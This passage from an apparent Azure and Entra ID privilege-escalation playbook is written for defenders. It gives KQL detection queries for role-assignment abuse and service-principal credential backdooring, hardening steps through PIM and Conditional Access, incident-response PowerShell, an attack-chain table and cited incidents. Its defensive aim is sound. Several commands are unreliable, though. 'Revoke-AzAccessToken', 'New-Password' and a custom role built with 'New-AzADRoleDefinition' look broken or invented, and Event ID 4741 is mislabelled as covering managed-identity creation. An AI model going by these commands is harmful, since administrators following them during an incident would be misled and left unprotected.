- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect when a user with only Contributor permissions creates Owner-level resources
let ContributorUsers = AuditLogs
| where OperationName == "Add role assignment"
    and TargetResources has "Contributor"
| extend ContributorUser = tostring(InitiatedBy.user.userPrincipalName)
| distinct ContributorUser;

AzureActivity
| where Caller in (ContributorUsers)
    and (OperationName == "Create or Update Automation Account" 
         or OperationName == "Create or Update Function App"
         or OperationName == "Create or Update User Assigned Identity")
| extend ResourceType = tostring(split(ResourceId, "/")[-3])
| summarize Count = count(), Resources = make_set(ResourceId) by Caller, TimeGenerated
| where Count >= 2
```

**What This Detects:**
- When a Contributor user creates Function Apps, Automation Accounts, or Managed Identities (potential privilege escalation setup).

### Query 3: Service Principal Credential Addition

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** Critical
- **Frequency:** Real-time

**KQL Query:**
```kusto
// Detect when new credentials are added to a service principal
AuditLogs
| where OperationName == "Add service principal credentials"
    or OperationName == "Add application" 
| extend SPDisplayName = tostring(TargetResources[0].displayName)
| extend InitiatedByUser = tostring(InitiatedBy.user.userPrincipalName)
| where SPDisplayName has_any ("Exchange", "Office 365", "Microsoft Graph")  // High-risk Microsoft SPs
| summarize CredentialCount = count() by InitiatedByUser, SPDisplayName, TimeGenerated
```

**What This Detects:**
- When credentials are added to Microsoft's built-in service principals (potential backdooring).

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID 4741: Computer Account Created (For UAMI Creation)

**Log Source:** Security (on domain-joined systems) or Azure Activity Log (for cloud-only)

**Applies To Versions:** All

**Filter:** Resource type contains "Microsoft.ManagedIdentity/userAssignedIdentities"

**Manual Configuration Steps (Azure):**
- Enable Azure Activity Log (enabled by default)
- No local configuration needed for cloud-only resources

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Alert: Suspicious Role Assignment

**Alert Name:** `Suspicious role assignment detected`

**Severity:** High

**Description:** A user or service principal has been assigned an Owner, User Access Administrator, or other privileged role outside of normal administrative practices.

**Applies To:** All Azure subscriptions with Defender for Cloud enabled

**Remediation:**
1. Review the role assignment in Azure Portal
2. Determine if the assignment is legitimate
3. If malicious:
   - Remove the role assignment immediately
   - Disable the user account or service principal
   - Audit all actions performed by the compromised identity
   - Reset credentials for affected accounts

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Role Assignment Changes

```powershell
Search-UnifiedAuditLog -Operations "Add role assignment", "Remove role assignment" `
  -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) | 
  Select-Object @{n='User';e={$_.UserIds}}, @{n='Operation';e={$_.Operations}}, `
  @{n='Target';e={$_.AuditData}} | Export-Csv -Path "C:\Audit\role_changes.csv"
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable Direct Role Assignment; Require Privileged Identity Management (PIM):** Enforce time-limited, approval-based access instead of permanent role assignments.
  
  **Applies To Versions:** All Azure subscriptions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Azure Resources**
  2. Select **Subscriptions**
  3. For each critical role (Owner, User Access Administrator, Application Administrator):
     - Click on the role
     - **Settings** → Set **Assignment type** to "Eligible" (not "Active")
     - Enable **MFA required on activation**: ON
     - Set **Maximum activation duration**: 4 hours
     - Enable **Approval required**: ON
  4. Click **Save**
  
  **Validation Command:**
  ```powershell
  # Check that no permanent Owner assignments exist
  Get-AzRoleAssignment -RoleDefinitionName "Owner" | 
    Where-Object { $_.PrincipalType -ne "ServicePrincipal" } |
    Select-Object -Property RoleDefinitionName, DisplayName, Scope
  
  # Expected: Minimal or zero results for user/group assignments (should be in PIM instead)
  ```

- **Restrict Service Principal Credential Creation:** Prevent Application Administrators from backdooring Microsoft's first-party service principals.
  
  **Applies To Versions:** All
  
  **Manual Steps (Custom RBAC Role - Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Go to **Custom roles** (or create new)
  3. Remove the permission: `microsoft.directory/applications/credentials/create`
  4. Assign the modified role to Application Administrators (with restrictions)
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Create a custom role that restricts credential creation
  $customRole = New-AzADRoleDefinition -Name "RestrictedApplicationAdmin" `
    -Permissions @(
      @{
        AllowedActions = @(
          "microsoft.directory/applications/create"
          "microsoft.directory/applications/*/read"
          "microsoft.directory/applications/delete"
        )
        NotActions = @(
          "microsoft.directory/applications/credentials/create"  # DENIED
          "microsoft.directory/applications/credentials/update"  # DENIED
        )
      }
    )
  ```

- **Enable Conditional Access for Privileged Role Operations:** Block role assignments from non-compliant devices or suspicious locations.
  
  **Applies To Versions:** All
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Privilege Escalation from Untrusted Locations`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Azure Service Management API**
  5. **Conditions:**
     - Locations: **Exclude trusted locations only**
     - Device State: **Require Compliant device**
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

- **Audit and Restrict Managed Identity Assignments:** Limit which users can assign managed identities to resources (privilege escalation vector).
  
  **Manual Steps (Custom RBAC Role - PowerShell):**
  ```powershell
  # Create a role that restricts managed identity assignment
  $role = @{
    Name = "VirtualMachineContributor_NoIdentityAssignment"
    IsCustom = $true
    Description = "Virtual Machine Contributor without managed identity assignment rights"
    Actions = @(
      "Microsoft.Compute/virtualMachines/read"
      "Microsoft.Compute/virtualMachines/write"
      "Microsoft.Compute/virtualMachines/delete"
      "Microsoft.Compute/virtualMachines/start/action"
      "Microsoft.Compute/virtualMachines/restart/action"
    )
    NotActions = @(
      "Microsoft.Compute/virtualMachines/identity/*"  # DENY identity operations
      "Microsoft.ManagedIdentity/*"  # DENY managed identity operations
    )
    Scope = "/subscriptions/{subscriptionId}"
  }
  
  New-AzRoleDefinition -Role $role
  ```

### Priority 2: HIGH

- **Restrict Automation Account Run-As Accounts:** Prevent Automation Accounts from having Contributor or Owner roles.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Automation Accounts**
  2. For each Automation Account:
     - Select **Identity**
     - Check assigned roles
     - If Contributor or Owner: **Remove role assignment** and assign minimal scope (specific resource only)

- **Require MFA for All Cloud Administrative Accounts:** Enforce MFA for accounts with Contributor or Owner roles.
  
  **Manual Steps (Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create a policy requiring **Require multi-factor authentication** for users with privileged roles
  3. Apply to: Privileged users / Service principals with Owner/Contributor roles

- **Monitor and Audit Role Assignment Changes:** Enable real-time alerting for role assignment events.
  
  **Manual Steps (Sentinel):**
  1. Create a scheduled query rule in Sentinel (as per Detection section above)
  2. Set alert frequency to **Real-time (5 minutes)**
  3. Configure actions: **Send email to SOC**, **Create incident**

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Role Assignments:**
  - Unexpected Owner, User Access Administrator assignments (especially to service principals or new users)
  - Contributor assignments to automation/function app accounts
  
- **Service Principal Activity:**
  - New credentials added to Microsoft first-party service principals (Office 365 Exchange Online, etc.)
  - Unusual API calls from service principals (e.g., Domain.ReadWrite.All usage)
  
- **Resource Creation:**
  - Function Apps, Automation Accounts created by Contributor-level users
  - Managed identities with elevated role assignments

### Forensic Artifacts

- **Cloud Logs:**
  - Azure Activity Log: "Add role assignment", "Add service principal credentials"
  - AuditLogs: OperationName entries for role/credential changes
  - SigninLogs: Authentication attempts by compromised service principals

- **Memory/Process (if endpoint compromised):**
  - PowerShell history containing credential creation commands
  - Browser cache with Azure Portal role assignment operations

### Response Procedures

1. **Isolate:**
   - Immediately disable the compromised user or service principal account
   - Revoke all active tokens/sessions
   
   **Command (PowerShell):**
   ```powershell
   # Disable user account
   Update-AzADUser -ObjectId "user-object-id" -AccountEnabled $false
   
   # Revoke all tokens
   Revoke-AzAccessToken -ObjectId "user-object-id"
   
   # Disable service principal (revoke credentials)
   Remove-AzADAppCredential -ObjectId "sp-object-id"
   ```

2. **Collect Evidence:**
   - Export Azure Activity Log for the past 7 days
   - Export AuditLogs from Entra ID
   
   **Command (PowerShell):**
   ```powershell
   # Export activity log
   Get-AzLog -StartTime (Get-Date).AddDays(-7) | Export-Csv -Path "C:\Incident\activity_log.csv"
   
   # Export audit logs (requires Sentinel or AzureAD module)
   Search-AzureADLog -Filter "initiatedBy/user/userPrincipalName eq 'attacker@domain.com'" | Export-Csv -Path "C:\Incident\audit_log.csv"
   ```

3. **Remediate:**
   - Remove all unauthorized role assignments
   - Delete any backdoor accounts or service principals
   - Reset credentials for affected accounts
   - Re-enable compromised accounts if they were legitimate
   
   **Command (PowerShell):**
   ```powershell
   # Remove unauthorized role assignments
   Get-AzRoleAssignment -ObjectId "compromised-id" | Remove-AzRoleAssignment
   
   # Delete backdoor accounts
   Remove-AzADUser -ObjectId "backdoor-account-id"
   
   # Reset passwords for legitimate accounts
   $newPassword = New-Password -Length 24 -Special
   Set-AzADUserPassword -ObjectId "legitimate-account-id" -Password (ConvertTo-SecureString -AsPlainText $newPassword -Force)
   ```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker tricks user into granting application permissions |
| **2** | **Privilege Escalation** | **[PE-VALID-010]** | **Escalate via role assignment abuse or service principal backdooring** |
| **3** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Create permanent backdoor admin account |
| **4** | **Data Exfiltration** | [CA-UNSC-007] Azure Key Vault Secret Extraction | Access all organization secrets |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Use stolen credentials to move to on-premises AD |
| **6** | **Impact** | [PE-ACCTMGMT-012] Hybrid RBAC/PIM Role Activation | Gain control of hybrid infrastructure |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Datadog I SPy - Service Principal Hijacking (2025)

- **Target:** Microsoft Entra ID enterprise tenant
- **Timeline:** Application Admin account compromised (June 2025) → Exchange Online SP backdoored (June 2025) → Global Admin impersonation achieved (June 2025)
- **Technique Status:** Attacker used compromised Application Administrator account to add credentials to Office 365 Exchange Online service principal; then used the hijacked SP to forge SAML tokens for any hybrid user (including Global Admins)
- **Impact:** Complete tenant compromise; attacker accessed all M365 data and Azure subscriptions
- **Reference:** [Datadog: I SPy - Escalating to Entra ID's Global Admin](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)

### Example 2: Cyngular Security - Contributor to Owner Escalation (2025)

- **Target:** Financial services organization with Azure subscriptions
- **Timeline:** Attacker obtains Contributor role (via phishing) → Creates Function App with elevated UAMI (December 2024) → Assigns Owner role to UAMI → Executes code as Owner (December 2024)
- **Technique Status:** Contributor role proved sufficient to escalate to Owner by creating resources with privileged managed identities
- **Impact:** Access to all Key Vaults; extraction of database credentials; deployment of malware via runbooks
- **Reference:** [Cyngular Security: When Contributor Means Control](https://www.cyngular.com/resource-center/when-contributor-means-control-the-hidden-risk-in-azure-rbac/)

### Example 3: Storm-0501 - Azure Privilege Escalation via Elevation (2025)

- **Target:** Enterprise with 2,000+ Azure resources
- **Timeline:** Initial compromise of Global Admin (via phishing) → Invoked Microsoft.Authorization/elevateAccess/action → Became User Access Administrator on all subscriptions → Assigned Owner role on all subscriptions
- **Technique Status:** Used built-in elevation mechanism available to Entra ID Global Admins to gain Owner on Azure RBAC scope
- **Impact:** Full Azure infrastructure compromise; ransomware deployment across all subscriptions
- **Reference:** [Microsoft: Storm-0501's Evolving Techniques](https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/)

---

## 16. COMPLIANCE & REGULATORY CONTEXT

This technique directly violates security requirements in:

- **GDPR Art. 32:** Requires pseudonymization and encryption; privilege escalation enables access to unencrypted data
- **NIST 800-53 AC-3:** Requires enforced access controls; over-privileged roles violate this requirement
- **ISO 27001 A.9.2.3:** Requires privilege access management; PIM is mandatory to address this control
- **NIS2 Art. 21:** Requires cyber risk management; uncontrolled role assignments fail this requirement

Organizations should enforce PIM, conditional access, and continuous monitoring to maintain compliance.

---

## 17. REFERENCES & AUTHORITATIVE SOURCES

1. [Microsoft Learn: Azure RBAC Documentation](https://learn.microsoft.com/en-us/azure/role-based-access-control/)
2. [Datadog: I SPy - Service Principal Hijacking](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)
3. [Cyngular Security: Contributor to Owner Escalation](https://www.cyngular.com/resource-center/when-contributor-means-control-the-hidden-risk-in-azure-rbac/)
4. [Cloud Security Alliance: Azure IAM Threats](https://cloudsecurityalliance.org/)
5. [MITRE ATT&CK: T1078.004 Valid Accounts - Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
6. [SpecterOps: Azure AD Attack & Defense Playbook](https://github.com/specterops/at-ps)
7. [NetSPI: MicroBurst - Azure Security Tool](https://github.com/NetSPI/MicroBurst)
8. [Dirk-jan Mollema: Azure AD Privilege Escalation](https://dirkjanm.io/azure-ad-privilege-escalation/)
9. [Microsoft: Privileged Identity Management Documentation](https://learn.microsoft.com/en-us/azure/active-directory/privileged-identity-management/)
10. [Orca Security: Azure IAM & AD Research](https://orca.security/resources/research-pod/azure-identity-access-management-iam-active-directory-ad/)

---